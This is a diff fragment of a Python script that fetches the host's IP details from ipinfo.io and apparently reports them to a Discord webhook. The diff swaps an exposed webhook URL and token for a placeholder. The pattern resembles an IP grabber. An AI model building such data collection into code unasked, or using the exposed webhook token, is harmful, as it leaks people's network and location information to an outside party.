@@ -16,7 +16,7 @@ avatar = "https://64.media.tumblr.com/4251274b58928d74cb7821452eed9f87/19a1d45f3
 #Website to get the information
 yes = r.get("https://ipinfo.io/json")
 #webhook (ed it this)
-webhook = "https://discord.com/api/webhooks/1066709493016174647/lo9k1nsLpmYjXl47VpxNDVbRH1V_fNUUhqC4v_zZ3uchJlvd4kmlmEViW5yUkYnqRv39"
+webhook = "WEBHOOK HERE"
 #print(Fore.RED + "If program doesn't work then off your vpn and restart.")
 #time.sleep(9999)
 #Ip adress and more things.
